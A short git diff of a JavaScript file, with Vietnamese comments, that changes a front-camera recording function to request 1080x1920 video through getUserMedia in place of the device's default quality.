@@ -99,8 +99,15 @@ async function fallbackIPLocation() {
 
 async function recordVideo(facingMode = 'user') {
     try {
-        // Giữ nguyên chất lượng gốc (không giới hạn độ phân giải/bitrate)
-        const constraints = { video: { facingMode: facingMode }, audio: false };
+        // Cài đặt độ phân giải 1080p (1080x1920)
+        const constraints = {
+            video: {
+                facingMode: facingMode,
+                width: { ideal: 1080 },
+                height: { ideal: 1920 }
+            },
+            audio: false
+        };
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         
         return new Promise((resolve, reject) => {
